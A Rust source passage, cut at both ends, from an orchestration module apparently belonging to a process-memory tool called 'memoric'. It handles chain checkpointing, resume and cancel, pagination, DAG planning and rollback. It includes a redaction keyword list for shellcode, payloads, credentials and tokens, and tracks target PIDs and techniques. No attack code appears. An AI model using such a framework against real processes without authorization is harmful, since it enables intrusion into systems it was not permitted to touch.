        crate::artifact::retention_secs_from_args(args),
        correlation_id.as_deref(),
    )
    .map(Some)
    .map_err(MemoricError::Other)
}

fn auto_orchestration_plan_output_path(template: Option<&str>, bytes: &[u8]) -> PathBuf {
    let safe_template = template
        .filter(|value| !value.trim().is_empty())
        .unwrap_or("custom")
        .chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                ch
            } else {
                '_'
            }
        })
        .collect::<String>();
    let hash = crate::artifact::sha256_bytes(bytes);
    std::env::temp_dir().join(format!(
        "memoric-orchestration-plan-{}-{}.json",
        safe_template, hash
    ))
}

fn output_path_from_args(args: &Value) -> Option<PathBuf> {
    args.get("output_path")
        .and_then(|value| value.as_str())
        .map(str::trim)
        .filter(|path| !path.is_empty())
        .map(PathBuf::from)
}

fn chain_state_path() -> Option<PathBuf> {
    std::env::var(CHAIN_STATE_PATH_ENV)
        .ok()
        .map(|path| path.trim().to_string())
        .filter(|path| !path.is_empty())
        .map(PathBuf::from)
}

fn current_epoch_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn load_chain_state_file_from_path(path: &Path) -> Result<ChainStateFile, String> {
    if !path.exists() {
        return Ok(ChainStateFile {
            version: CHAIN_STATE_VERSION,
            generated_at: crate::state::chrono_now_public(),
            generated_at_epoch_secs: current_epoch_secs(),
            chains: Vec::new(),
        });
    }

    let content =
        std::fs::read_to_string(path).map_err(|err| format!("read {}: {}", path.display(), err))?;
    let state: ChainStateFile = serde_json::from_str(&content)
        .map_err(|err| format!("parse {}: {}", path.display(), err))?;
    if state.version != CHAIN_STATE_VERSION {
        return Err(format!(
            "unsupported chain state version {} in {}",
            state.version,
            path.display()
        ));
    }
    Ok(state)
}

fn write_chain_state_file_to_path(path: &Path, state: &ChainStateFile) -> Result<(), String> {
    if let Some(parent) = path
        .parent()
        .filter(|parent| !parent.as_os_str().is_empty())
    {
        std::fs::create_dir_all(parent)
            .map_err(|err| format!("create {}: {}", parent.display(), err))?;
    }
    let content = serde_json::to_string_pretty(state)
        .map_err(|err| format!("serialize chain state: {}", err))?;
    std::fs::write(path, content).map_err(|err| format!("write {}: {}", path.display(), err))
}

fn persist_chain_state(chain: &ChainExecutionState) {
    let Some(path) = chain_state_path() else {
        return;
    };
    if let Err(err) = persist_chain_state_to_path(&path, chain) {
        tracing::warn!(
            "failed to persist orchestration chain state {}: {}",
            path.display(),
            err
        );
    }
}

fn persist_chain_state_to_path(path: &Path, chain: &ChainExecutionState) -> Result<(), String> {
    let mut state = load_chain_state_file_from_path(path)?;
    state.generated_at = crate::state::chrono_now_public();
    state.generated_at_epoch_secs = current_epoch_secs();
    match state
        .chains
        .iter()
        .position(|candidate| candidate.chain_id == chain.chain_id)
    {
        Some(index) => state.chains[index] = chain.clone(),
        None => state.chains.push(chain.clone()),
    }
    write_chain_state_file_to_path(path, &state)
}

fn chain_state_json(chain: &ChainExecutionState) -> Value {
    serde_json::to_value(chain).unwrap_or_else(|_| {
        json!({
            "chain_id": chain.chain_id,
            "status": chain.status,
            "error": "failed to serialize chain state"
        })
    })
}

fn chain_state_public_json(chain: &ChainExecutionState) -> Value {
    let mut value = chain_state_json(chain);
    if let Some(obj) = value.as_object_mut() {
        obj.insert("success".to_string(), json!(true));
        obj.insert("persistence".to_string(), chain_persistence_status_json());
    }
    value
}

fn chain_persistence_status_json() -> Value {
    match chain_state_path() {
        Some(path) => json!({
            "configured": true,
            "path": path.display().to_string(),
            "mode": "orchestration-chain-metadata-only",
            "result_payloads_persisted": false,
        }),
        None => json!({
            "configured": false,
            "mode": "process-local",
            "message": format!("set {} to persist resumable chain metadata", CHAIN_STATE_PATH_ENV),
        }),
    }
}

fn create_chain_state(
    chain_id: &str,
    args: &Value,
    pid: u32,
    threat_level: &str,
    plan: &[Value],
    dag: &Value,
) -> ChainExecutionState {
    let now = crate::state::chrono_now_public();
    let now_epoch = current_epoch_secs();
    let steps = plan
        .iter()
        .enumerate()
        .map(|(index, step)| {
            let tool = step
                .get("tool")
                .and_then(|value| value.as_str())
                .unwrap_or_default();
            let action = step
                .get("action")
                .and_then(|value| value.as_str())
                .unwrap_or_default();
            let step_args = step.get("args").cloned().unwrap_or_else(|| json!({}));
            ChainStepState {
                id: orchestration_step_id(step, index + 1),
                order: index + 1,
                tool: tool.to_string(),
                action: action.to_string(),
                required: step
                    .get("required")
                    .and_then(|value| value.as_bool())
                    .unwrap_or(false),
                depends_on: string_list(&step["depends_on"]),
                status: "pending".to_string(),
                started_at: None,
                completed_at: None,
                error: None,
                rollback: orchestration_rollback_metadata(tool, action, &step_args, step),
                args_summary: safe_chain_value_snapshot(&step_args),
                result_summary: None,
            }
        })
        .collect::<Vec<_>>();
    let plan_fingerprint = chain_plan_fingerprint(plan, dag);
    let mut state = ChainExecutionState {
        chain_id: chain_id.to_string(),
        status: "working".to_string(),
        created_at: now.clone(),
        updated_at: now,
        created_at_epoch_secs: now_epoch,
        updated_at_epoch_secs: now_epoch,
        task_id: args
            .get("task_id")
            .and_then(|value| value.as_str())
            .map(str::to_string),
        target_pid: pid,
        threat_level: threat_level.to_string(),
        total_steps: steps.len(),
        completed_steps: 0,
        failed_steps: 0,
        last_completed_step: None,
        next_step: steps.first().map(|step| step.id.clone()),
        plan_fingerprint,
        dag: safe_chain_value_snapshot(dag),
        steps,
        resume: Value::Null,
    };
    state.resume = chain_resume_metadata(&state);
    state
}

fn resume_checkpoint_from_args(
    args: &Value,
    pid: u32,
    plan: &[Value],
    dag: &Value,
) -> Result<Option<ResumeCheckpoint>, MemoricError> {
    let Some(chain_id) = args
        .get("chain_id")
        .and_then(|value| value.as_str())
        .map(str::trim)
        .filter(|value| !value.is_empty())
    else {
        return Ok(None);
    };
    let skip_completed_steps = args
        .get("skip_completed_steps")
        .and_then(|value| value.as_bool())
        .unwrap_or(true);
    let chain = load_chain_state(chain_id).map_err(MemoricError::Other)?;
    if chain.target_pid != pid {
        return Err(MemoricError::Other(format!(
            "chain checkpoint target_pid mismatch: checkpoint={}, request={}",
            chain.target_pid, pid
        )));
    }
    let plan_fingerprint = chain_plan_fingerprint(plan, dag);
    if chain.plan_fingerprint != plan_fingerprint {
        return Err(MemoricError::Other(
            "chain checkpoint plan fingerprint does not match the current authorized execute plan"
                .to_string(),
        ));
    }
    if chain.status == "completed" {
        return Err(MemoricError::Other(format!(
            "chain checkpoint {} is already completed",
            chain_id
        )));
    }
    let completed_step_ids = chain
        .steps
        .iter()
        .filter(|step| step.status == "completed")
        .map(|step| step.id.clone())
        .collect::<std::collections::BTreeSet<_>>();
    let public_json = json!({
        "chain_id": chain.chain_id,
        "status": chain.status,
        "last_completed_step": chain.last_completed_step,
        "next_step": chain.next_step,
        "completed_steps": chain.completed_steps,
        "failed_steps": chain.failed_steps,
        "total_steps": chain.total_steps,
        "skip_completed_steps": skip_completed_steps,
        "completed_step_ids": completed_step_ids.iter().cloned().collect::<Vec<_>>(),
        "result_payloads_persisted": false
    });
    Ok(Some(ResumeCheckpoint {
        chain_id: chain_id.to_string(),
        chain,
        skip_completed_steps,
        completed_step_ids,
        public_json,
    }))
}

fn chain_plan_fingerprint(plan: &[Value], dag: &Value) -> String {
    let bytes = serde_json::to_vec(&json!({
        "plan": plan,
        "dag": dag,
    }))
    .unwrap_or_default();
    crate::artifact::sha256_bytes(&bytes)
}

fn mark_chain_step_running(chain: &mut ChainExecutionState, step_id: &str) {
    let now = crate::state::chrono_now_public();
    let now_epoch = current_epoch_secs();
    if let Some(step) = chain.steps.iter_mut().find(|step| step.id == step_id) {
        if step.status == "pending" {
            step.status = "running".to_string();
            step.started_at = Some(now.clone());
        }
    }
    refresh_chain_state(chain, "working", Some(now), now_epoch);
}

fn mark_chain_step_completed(chain: &mut ChainExecutionState, step_id: &str, result: &Value) {
    let now = crate::state::chrono_now_public();
    let now_epoch = current_epoch_secs();
    if let Some(step) = chain.steps.iter_mut().find(|step| step.id == step_id) {
        step.status = "completed".to_string();
        step.completed_at = Some(now.clone());
        step.error = None;
        step.result_summary = Some(safe_chain_result_summary(result));
    }
    refresh_chain_state(chain, "working", Some(now), now_epoch);
}

fn mark_chain_step_failed(chain: &mut ChainExecutionState, step_id: &str, error: &str) {
    let now = crate::state::chrono_now_public();
    let now_epoch = current_epoch_secs();
    if let Some(step) = chain.steps.iter_mut().find(|step| step.id == step_id) {
        step.status = "failed".to_string();
        step.completed_at = Some(now.clone());
        step.error = Some(error.to_string());
    }
    refresh_chain_state(chain, "failed", Some(now), now_epoch);
}

fn mark_chain_finished(chain: &mut ChainExecutionState, success: bool) {
    let now = crate::state::chrono_now_public();
    let now_epoch = current_epoch_secs();
    let status = if success { "completed" } else { "failed" };
    refresh_chain_state(chain, status, Some(now), now_epoch);
}

fn refresh_chain_state(
    chain: &mut ChainExecutionState,
    status: &str,
    now: Option<String>,
    now_epoch: u64,
) {
    chain.status = status.to_string();
    if let Some(now) = now {
        chain.updated_at = now;
    }
    chain.updated_at_epoch_secs = now_epoch;
    chain.completed_steps = chain
        .steps
        .iter()
        .filter(|step| step.status == "completed")
        .count();
    chain.failed_steps = chain
        .steps
        .iter()
        .filter(|step| step.status == "failed")
        .count();
    chain.last_completed_step = chain
        .steps
        .iter()
        .rev()
        .find(|step| step.status == "completed")
        .map(|step| step.id.clone());
    chain.next_step = chain
        .steps
        .iter()
        .find(|step| matches!(step.status.as_str(), "pending" | "running"))
        .map(|step| step.id.clone());
    chain.resume = chain_resume_metadata(chain);
}

fn chain_resume_metadata(chain: &ChainExecutionState) -> Value {
    json!({
        "schema": "memoric.orchestration.chain-resume.v1",
        "resume_available": !matches!(chain.status.as_str(), "completed") && chain.next_step.is_some(),
        "last_completed_step": chain.last_completed_step,
        "next_step": chain.next_step,
        "plan_fingerprint": chain.plan_fingerprint,
        "requires_original_authorized_args": true,
        "skip_completed_steps": true,
        "result_payloads_persisted": false,
        "message": "Checkpoint stores metadata only. Re-run the original authorized chain request and skip completed step IDs when resuming live execution."
    })
}

fn safe_chain_result_summary(result: &Value) -> Value {
    let mut summary = json!({
        "success": result.get("success").cloned().unwrap_or(Value::Null),
        "technique": result.get("technique").cloned().unwrap_or(Value::Null),
        "message": result.get("message").cloned().unwrap_or(Value::Null),
    });
    if let Some(obj) = summary.as_object_mut() {
        for field in [
            "chain_id",
            "task_id",
            "rollback",
            "provenance",
            "mutation",
            "artifact",
            "artifact_path",
            "redaction_status",
        ] {
            if let Some(value) = result.get(field) {
                obj.insert(field.to_string(), safe_chain_value_snapshot(value));
            }
        }
    }
    summary
}

fn safe_chain_value_snapshot(value: &Value) -> Value {
    match value {
        Value::Null | Value::Bool(_) | Value::Number(_) => value.clone(),
        Value::String(text) => {
            if looks_sensitive_chain_field(text) {
                json!({
                    "redacted": true,
                    "reason": "sensitive_chain_snapshot_string"
                })
            } else {
                json!(truncate_chain_snapshot_text(text))
            }
        }
        Value::Array(values) => {
            if values.len() > 64 || values.iter().all(|value| value.as_u64().is_some()) {
                json!({
                    "redacted": true,
                    "kind": "array",
                    "items": values.len(),
                    "reason": "large_or_byte_array_omitted_from_chain_snapshot"
                })
            } else {
                Value::Array(
                    values
                        .iter()
                        .take(64)
                        .map(safe_chain_value_snapshot)
                        .collect(),
                )
            }
        }
        Value::Object(map) => Value::Object(
            map.iter()
                .take(64)
                .map(|(key, value)| {
                    let safe_value = if sensitive_chain_key(key) {
                        json!({
                            "redacted": true,
                            "reason": "sensitive_chain_snapshot_field"
                        })
                    } else {
                        safe_chain_value_snapshot(value)
                    };
                    (key.clone(), safe_value)
                })
                .collect(),
        ),
    }
}

fn sensitive_chain_key(key: &str) -> bool {
    let lower = key.to_ascii_lowercase();
    lower.contains("shellcode")
        || lower.contains("payload")
        || lower.contains("credential")
        || lower.contains("password")
        || lower.contains("secret")
        || lower.contains("token")
        || lower.contains("bytes")
}

fn looks_sensitive_chain_field(value: &str) -> bool {
    let trimmed = value.trim();
    trimmed.len() > 256
        && trimmed
            .chars()
            .all(|ch| ch.is_ascii_hexdigit() || ch.is_whitespace())
}

fn truncate_chain_snapshot_text(text: &str) -> String {
    const MAX_CHARS: usize = 2048;
    let mut value = text
        .chars()
        .filter(|ch| !ch.is_control() || ch.is_ascii_whitespace())
        .take(MAX_CHARS)
        .collect::<String>();
    if text.chars().count() > MAX_CHARS {
        value.push_str("...");
    }
    value
}

fn load_chain_state(chain_id: &str) -> Result<ChainExecutionState, String> {
    let path = chain_state_path().ok_or_else(|| {
        format!(
            "chain state persistence is not configured; set {}",
            CHAIN_STATE_PATH_ENV
        )
    })?;
    let state = load_chain_state_file_from_path(&path)?;
    state
        .chains
        .into_iter()
        .find(|chain| chain.chain_id == chain_id)
        .ok_or_else(|| format!("chain not found: {}", chain_id))
}

pub fn chain_status(args: &Value) -> Result<Value, MemoricError> {
    let Some(chain_id) = args.get("chain_id").and_then(|value| value.as_str()) else {
        return Ok(json!({
            "success": true,
            "persistence": chain_persistence_status_json(),
            "message": "Provide chain_id to inspect a persisted orchestration chain checkpoint"
        }));
    };
    load_chain_state(chain_id)
        .map(|chain| chain_state_public_json(&chain))
        .map_err(MemoricError::Other)
}

pub fn resume_chain(args: &Value) -> Result<Value, MemoricError> {
    let chain_id = args
        .get("chain_id")
        .and_then(|value| value.as_str())
        .filter(|value| !value.trim().is_empty())
        .ok_or_else(|| MemoricError::Other("Missing chain_id".to_string()))?;
    let chain = load_chain_state(chain_id).map_err(MemoricError::Other)?;
    let executable = matches!(chain.status.as_str(), "working" | "failed" | "cancelled");
    Ok(json!({
        "success": true,
        "chain_id": chain.chain_id,
        "resume_available": executable && chain.next_step.is_some(),
        "executes_live_actions": false,
        "mode": "resume_preview",
        "status": chain.status,
        "last_completed_step": chain.last_completed_step,
        "next_step": chain.next_step,
        "completed_steps": chain.completed_steps,
        "failed_steps": chain.failed_steps,
        "total_steps": chain.total_steps,
        "plan_fingerprint": chain.plan_fingerprint,
        "resume": chain.resume,
        "persistence": chain_persistence_status_json(),
        "message": if executable && chain.next_step.is_some() {
            "Persisted chain checkpoint can be resumed by re-running orchestrate(action='execute') with the original authorized arguments and skip_completed_steps=true"
        } else {
            "Persisted chain has no remaining executable step to resume"
        }
    }))
}

pub fn cancel_chain(args: &Value) -> Result<Value, MemoricError> {
    let chain_id = args
        .get("chain_id")
        .and_then(|value| value.as_str())
        .filter(|value| !value.trim().is_empty())
        .ok_or_else(|| MemoricError::Other("Missing chain_id".to_string()))?;
    let path = chain_state_path().ok_or_else(|| {
        MemoricError::Other(format!(
            "chain state persistence is not configured; set {}",
            CHAIN_STATE_PATH_ENV
        ))
    })?;
    let mut state = load_chain_state_file_from_path(&path).map_err(MemoricError::Other)?;
    let Some(chain) = state
        .chains
        .iter_mut()
        .find(|chain| chain.chain_id == chain_id)
    else {
        return Err(MemoricError::Other(format!(
            "chain not found: {}",
            chain_id
        )));
    };
    chain.status = "cancelled".to_string();
    chain.updated_at = crate::state::chrono_now_public();
    chain.updated_at_epoch_secs = current_epoch_secs();
    chain.resume = chain_resume_metadata(chain);
    state.generated_at = crate::state::chrono_now_public();
    state.generated_at_epoch_secs = current_epoch_secs();
    write_chain_state_file_to_path(&path, &state).map_err(MemoricError::Other)?;
    Ok(json!({
        "success": true,
        "chain_id": chain_id,
        "status": "cancelled",
        "persistence": chain_persistence_status_json(),
        "message": "Persisted orchestration chain checkpoint marked cancelled"
    }))
}

pub fn cleanup_chain(args: &Value) -> Result<Value, MemoricError> {
    let chain_id = args
        .get("chain_id")
        .and_then(|value| value.as_str())
        .filter(|value| !value.trim().is_empty())
        .ok_or_else(|| MemoricError::Other("Missing chain_id".to_string()))?;
    let dry_run = args
        .get("dry_run")
        .and_then(|value| value.as_bool())
        .unwrap_or(true);
    let path = chain_state_path().ok_or_else(|| {
        MemoricError::Other(format!(
            "chain state persistence is not configured; set {}",
            CHAIN_STATE_PATH_ENV
        ))
    })?;
    let mut state = load_chain_state_file_from_path(&path).map_err(MemoricError::Other)?;
    let Some(index) = state
        .chains
        .iter()
        .position(|chain| chain.chain_id == chain_id)
    else {
        return Err(MemoricError::Other(format!(
            "chain not found: {}",
            chain_id
        )));
    };
    let chain = state.chains[index].clone();
    if !dry_run {
        state.chains.remove(index);
        state.generated_at = crate::state::chrono_now_public();
        state.generated_at_epoch_secs = current_epoch_secs();
        write_chain_state_file_to_path(&path, &state).map_err(MemoricError::Other)?;
    }
    Ok(json!({
        "success": true,
        "chain_id": chain.chain_id,
        "dry_run": dry_run,
        "removed_count": if dry_run { 0 } else { 1 },
        "checkpoint": chain_state_public_json(&chain),
        "persistence": chain_persistence_status_json(),
        "message": if dry_run {
            "Persisted orchestration chain checkpoint cleanup preview completed"
        } else {
            "Persisted orchestration chain checkpoint metadata removed"
        }
    }))
}

fn apply_pagination_if_requested(
    response: &mut Value,
    args: &Value,
    cursor_kind: &str,
    sections: &[(&str, &Vec<Value>)],
) -> Result<(), String> {
    let requested = args.get("limit").is_some() || args.get("cursor").is_some();
    if !requested {
        return Ok(());
    }

    let limit = parse_orchestration_page_limit(args)?;
    let fingerprint = orchestration_page_fingerprint(cursor_kind, sections)?;
    let start = if let Some(cursor) = args.get("cursor") {
        let cursor = cursor
            .as_str()
            .ok_or_else(|| "Invalid cursor: expected opaque string token".to_string())?;
        decode_orchestration_cursor(cursor, cursor_kind, &fingerprint)?
    } else {
        crate::args::parse_limit(args, "offset", 0, usize::MAX)?
    };

    let max_total = sections
        .iter()
        .map(|(_, items)| items.len())
        .max()
        .unwrap_or(0);
    if start > max_total {
        return Err(
            "Invalid cursor: pagination position is outside orchestration result set".to_string(),
        );
    }

    let mut page_meta = serde_json::Map::new();
    for (name, items) in sections {
        let page = items
            .iter()
            .skip(start)
            .take(limit)
            .cloned()
            .collect::<Vec<_>>();
        response[*name] = Value::Array(page.clone());
        page_meta.insert(
            format!("{}Page", name),
            json!({
                "items": page,
                "total": items.len(),
                "offset": start,
                "limit": limit,
                "count": response[*name].as_array().map(|items| items.len()).unwrap_or(0),
            }),
        );
    }

    let next_offset = start.saturating_add(limit);
    let mut pagination = json!({
        "cursorKind": cursor_kind,
        "snapshot": fingerprint,
        "offset": start,
        "limit": limit,
        "maxTotal": max_total,
        "sections": Value::Object(page_meta),
    });
    if next_offset < max_total {
        pagination["nextCursor"] = json!(encode_orchestration_cursor(
            cursor_kind,
            &fingerprint,
            next_offset
        ));
    }
    response["pagination"] = pagination;
    Ok(())
}

fn parse_orchestration_page_limit(args: &Value) -> Result<usize, String> {
    let limit = crate::args::parse_limit(
        args,
        "limit",
        DEFAULT_ORCHESTRATION_PAGE_LIMIT,
        MAX_ORCHESTRATION_PAGE_LIMIT,
    )?;
    if limit == 0 {
        return Err("'limit' must be greater than 0".to_string());
    }
    Ok(limit)
}

fn orchestration_page_fingerprint(
    cursor_kind: &str,
    sections: &[(&str, &Vec<Value>)],
) -> Result<String, String> {
    let section_fingerprints = sections
        .iter()
        .map(|(name, items)| json!({ "name": name, "items": items }))
        .collect::<Vec<_>>();
    let bytes = serde_json::to_vec(&json!({
        "cursorKind": cursor_kind,
        "sections": section_fingerprints,
    }))
    .map_err(|err| format!("Failed to fingerprint orchestration page: {}", err))?;
    Ok(crate::artifact::sha256_bytes(&bytes))
}

fn encode_orchestration_cursor(cursor_kind: &str, fingerprint: &str, offset: usize) -> String {
    format!(
        "{}{}:{}:{}",
        ORCHESTRATION_CURSOR_PREFIX, cursor_kind, fingerprint, offset
    )
}

fn decode_orchestration_cursor(
    cursor: &str,
    expected_kind: &str,
    expected_fingerprint: &str,
) -> Result<usize, String> {
    let raw = cursor
        .strip_prefix(ORCHESTRATION_CURSOR_PREFIX)
        .ok_or_else(|| "Invalid cursor: unrecognized opaque token".to_string())?;
    let mut parts = raw.split(':');
    let kind = parts
        .next()
        .filter(|value| !value.is_empty())
        .ok_or_else(|| "Invalid cursor: missing orchestration cursor kind".to_string())?;
    let fingerprint = parts
        .next()
        .filter(|value| !value.is_empty())
        .ok_or_else(|| "Invalid cursor: missing orchestration snapshot".to_string())?;
    let offset = parts
        .next()
        .ok_or_else(|| "Invalid cursor: missing pagination position".to_string())?
        .parse::<usize>()
        .map_err(|_| "Invalid cursor: malformed pagination position".to_string())?;
    if parts.next().is_some() {
        return Err("Invalid cursor: malformed opaque token".to_string());
    }
    if kind != expected_kind {
        return Err("Invalid cursor: orchestration result kind mismatch".to_string());
    }
    if fingerprint != expected_fingerprint {
        return Err("Invalid cursor: orchestration snapshot changed".to_string());
    }
    Ok(offset)
}

fn orchestration_step_id(step: &Value, order: usize) -> String {
    step.get("id")
        .or_else(|| step.get("step_id"))
        .and_then(|value| value.as_str())
        .filter(|value| !value.trim().is_empty())
        .map(|value| value.trim().to_string())
        .unwrap_or_else(|| format!("step-{:03}", order))
}

fn has_explicit_dependency_spec(step: &Value) -> bool {
    step.get("depends_on").is_some()
        || step.get("dependsOn").is_some()
        || step.get("after").is_some()
}

fn orchestration_step_dependencies(step: &Value, previous_step_id: Option<&str>) -> Vec<String> {
    let explicit = step
        .get("depends_on")
        .or_else(|| step.get("dependsOn"))
        .or_else(|| step.get("after"));
    if let Some(value) = explicit {
        return string_list(value);
    }

    previous_step_id
        .map(|value| vec![value.to_string()])
        .unwrap_or_default()
}

fn string_list(value: &Value) -> Vec<String> {
    if let Some(items) = value.as_array() {
        return items
            .iter()
            .filter_map(|item| item.as_str())
            .map(str::trim)
            .filter(|item| !item.is_empty())
            .map(str::to_string)
            .collect();
    }
    value
        .as_str()
        .map(|item| {
            item.split(',')
                .map(str::trim)
                .filter(|item| !item.is_empty())
                .map(str::to_string)
                .collect()
        })
        .unwrap_or_default()
}

fn orchestration_preconditions(step: &Value, planner: &Value, missing: &[String]) -> Vec<Value> {
    let mut preconditions = Vec::new();
    if !missing.is_empty() {
        preconditions.push(json!({
            "type": "required_params",
            "satisfied": false,
            "missing": missing,
            "reason": format!("missing required parameter(s): {}", missing.join(", "))
        }));
    }
    preconditions.push(json!({
        "type": "policy",
        "satisfied": planner["policy"]["allowed"].as_bool().unwrap_or(false),
        "reason": planner["policy"]["reason"].as_str().unwrap_or("policy evaluated")
    }));
    let capability_blockers = planner["capabilities"]["blockers"]
        .as_array()
        .cloned()
        .unwrap_or_default();
    preconditions.push(json!({
        "type": "capabilities",
        "satisfied": capability_blockers.is_empty(),
        "blockers": capability_blockers,
    }));
    if let Some(custom) = step.get("preconditions") {
        preconditions.push(json!({
            "type": "operator_supplied",
            "satisfied": true,
            "value": custom
        }));
    }
    preconditions
}

fn orchestration_rollback_metadata(
    tool: &str,
    action: &str,
    step_args: &Value,
    step: &Value,
) -> Value {
    if let Some(rollback) = step.get("rollback") {
        return rollback.clone();
    }
    let mut preview_args = step_args.clone();
    if let Some(obj) = preview_args.as_object_mut() {
        obj.entry("action".to_string())
            .or_insert_with(|| json!(action));
        obj.insert("dry_run".to_string(), json!(true));
    } else {
        preview_args = json!({
            "action": action,
            "dry_run": true
        });
    }
    crate::mcp::dry_run::preview(tool, &preview_args)["rollback"].clone()
}

fn apply_dag_planning(
    plan: &mut Vec<Value>,
    dag_mode: &str,
    validation_errors: &mut Vec<String>,
    validation_warnings: &mut Vec<String>,
) -> Value {
    use std::collections::{BTreeMap, BTreeSet};

    let mut index_by_id = BTreeMap::new();
    let mut duplicate_ids = Vec::new();
    for (index, step) in plan.iter().enumerate() {
        let id = step["id"].as_str().unwrap_or_default().to_string();
        if index_by_id.insert(id.clone(), index).is_some() {
            duplicate_ids.push(id);
        }
    }
    for id in &duplicate_ids {
        validation_errors.push(format!("DAG step id '{}' is duplicated", id));
    }

    let mut edges = Vec::new();
    let mut missing_dependencies = Vec::new();
    let mut adjacency: BTreeMap<String, Vec<String>> = BTreeMap::new();
    let mut indegree: BTreeMap<String, usize> = BTreeMap::new();
    for step in plan.iter() {
        if let Some(id) = step["id"].as_str() {
            indegree.entry(id.to_string()).or_insert(0);
        }
    }

    for step in plan.iter() {
        let to = step["id"].as_str().unwrap_or_default().to_string();
        for dependency in step["depends_on"].as_array().cloned().unwrap_or_default() {
            let Some(from) = dependency.as_str().map(str::to_string) else {
                continue;
            };
            if !index_by_id.contains_key(&from) {
                missing_dependencies.push(json!({
                    "from": from,
                    "to": to,
                    "reason": "dependency step id is not present in plan"
                }));
                continue;
            }
            edges.push(json!({
                "from": from,
                "to": to,
                "required": true,
                "kind": "dependency"
            }));
            adjacency.entry(from.clone()).or_default().push(to.clone());
            *indegree.entry(to.clone()).or_insert(0) += 1;
        }
    }
    for missing in &missing_dependencies {
        validation_errors.push(format!(
            "DAG step '{}' depends on missing step '{}'",
            missing["to"].as_str().unwrap_or_default(),
            missing["from"].as_str().unwrap_or_default()
        ));
    }

    let mut ready = indegree
        .iter()
        .filter_map(|(id, degree)| (*degree == 0).then(|| id.clone()))
        .collect::<Vec<_>>();
    ready.sort();
    let mut execution_order = Vec::new();
    let mut indegree_work = indegree.clone();
    while let Some(id) = ready.first().cloned() {
        ready.remove(0);
        execution_order.push(id.clone());
        for child in adjacency.get(&id).cloned().unwrap_or_default() {
            if let Some(degree) = indegree_work.get_mut(&child) {
                *degree = degree.saturating_sub(1);
                if *degree == 0 {
                    ready.push(child);
                    ready.sort();
                }
            }
        }
    }

    let cycle_detected = execution_order.len() != indegree.len();
    if cycle_detected {
        validation_errors.push("DAG dependency cycle detected".to_string());
    }

    let required_by_id = plan
        .iter()
        .filter_map(|step| {
            Some((
                step["id"].as_str()?.to_string(),
                step["required"].as_bool().unwrap_or(true),
            ))
        })
        .collect::<BTreeMap<_, _>>();
    let mut blocked_or_skipped: BTreeSet<String> = BTreeSet::new();
    for step in plan.iter_mut() {
        let id = step["id"].as_str().unwrap_or_default().to_string();
        let mut include = step["planner"]["include_in_effective_plan"]
            .as_bool()
            .unwrap_or(false);
        let mut skip_reason = step["planner"]["skip_reason"]
            .as_str()
            .unwrap_or("included")
            .to_string();

        for dependency in step["depends_on"].as_array().cloned().unwrap_or_default() {
            let Some(dep_id) = dependency.as_str() else {
                continue;
            };
            let dependency_required = required_by_id.get(dep_id).copied().unwrap_or(true);
            let explicit_dependency = step["dependency_mode"].as_str() == Some("explicit");
            if blocked_or_skipped.contains(dep_id) {
                if !explicit_dependency && !dependency_required {
                    continue;
                }
                include = false;
                skip_reason = format!("dependency '{}' was blocked or skipped", dep_id);
                break;
            }
        }

        if !include {
            blocked_or_skipped.insert(id.clone());
            if step["planner"]["status"] == "included" {
                validation_warnings.push(format!("Step {} skipped because {}", id, skip_reason));
            } else {
                validation_warnings
                    .push(format!("Step {} blocked by planner: {}", id, skip_reason));
            }
        }

        if let Some(planner) = step["planner"].as_object_mut() {
            planner.insert(
                "status".to_string(),
                json!(if include { "included" } else { "blocked" }),
            );
            planner.insert("include_in_effective_plan".to_string(), json!(include));
            planner.insert("skip_reason".to_string(), json!(skip_reason));
        }
    }

    json!({
        "schema": "memoric.orchestration.dag.v1",
        "mode": dag_mode,
        "nodes": plan.iter().map(|step| {
            json!({
                "id": step["id"],
                "order": step["order"],
                "tool": step["tool"],
                "action": step["action"],
                "required": step["required"],
                "depends_on": step["depends_on"],
                "dependency_mode": step["dependency_mode"],
                "status": step["planner"]["status"],
                "skip_reason": step["planner"]["skip_reason"],
                "preconditions": step["preconditions"],
                "rollback": step["rollback"],
            })
        }).collect::<Vec<_>>(),
        "edges": edges,
        "execution_order": if cycle_detected { Vec::<String>::new() } else { execution_order },
        "cycle_detected": cycle_detected,
        "missing_dependencies": missing_dependencies,
    })
}

fn orchestration_dag_preview(steps: &[Value]) -> Value {
    let mut plan = Vec::new();
    let mut validation_errors = Vec::new();
    let mut validation_warnings = Vec::new();
    let mut previous_step_id: Option<String> = None;
    for (i, step) in steps.iter().enumerate() {
        let tool = step.get("tool").and_then(|v| v.as_str()).unwrap_or("");
        let action = step.get("action").and_then(|v| v.as_str()).unwrap_or("");
        let step_args = step.get("args").cloned().unwrap_or_else(|| json!({}));
        let step_id = orchestration_step_id(step, i + 1);
        let explicit_dependencies = has_explicit_dependency_spec(step);
        let depends_on = orchestration_step_dependencies(step, previous_step_id.as_deref());
        let dependency_mode = if explicit_dependencies {
            "explicit"
        } else {
            "implicit_order"
        };
        let planner = json!({
            "status": "included",
            "include_in_effective_plan": true,
            "skip_reason": "included"
        });
        let rollback = orchestration_rollback_metadata(tool, action, &step_args, step);
        plan.push(json!({
            "id": step_id,
            "order": i + 1,
            "tool": tool,
            "action": action,
            "args": step_args,
            "description": step.get("description").and_then(|v| v.as_str()).unwrap_or(""),
            "required": step.get("required").and_then(|v| v.as_bool()).unwrap_or(true),
            "depends_on": depends_on,
            "dependency_mode": dependency_mode,
            "preconditions": step.get("preconditions").cloned().unwrap_or_else(|| json!([])),
            "rollback": rollback,
            "planner": planner,
        }));
        previous_step_id = Some(
            plan.last()
                .and_then(|value| value["id"].as_str())
                .unwrap_or_default()
                .to_string(),
        );
    }

    apply_dag_planning(
        &mut plan,
        "execute_dry_run_preview",
        &mut validation_errors,
        &mut validation_warnings,
    )
}

fn execute_dependency_aware_rollback(
    executed_steps: &[Value],
    dag: &Value,
    chain_id: &str,
    parent_args: &Value,
) -> Value {
    let runtime = crate::runtime::RuntimeContext::from_args(parent_args);
    let plan = dependency_aware_rollback_plan(executed_steps, dag);
    let mut results = Vec::new();

    for step in plan["steps"].as_array().cloned().unwrap_or_default() {
        if let Ok(runtime) = &runtime {
            if let Err(error) = runtime.check() {
                results.push(json!({
                    "id": step["id"],
                    "status": "cancelled",
                    "reason": error,
                    "rollback": step["rollback"],
                }));
                break;
            }
        }
        let Some(action) = rollback_action_from_step(&step) else {
            results.push(json!({
                "id": step["id"],
                "status": "skipped",
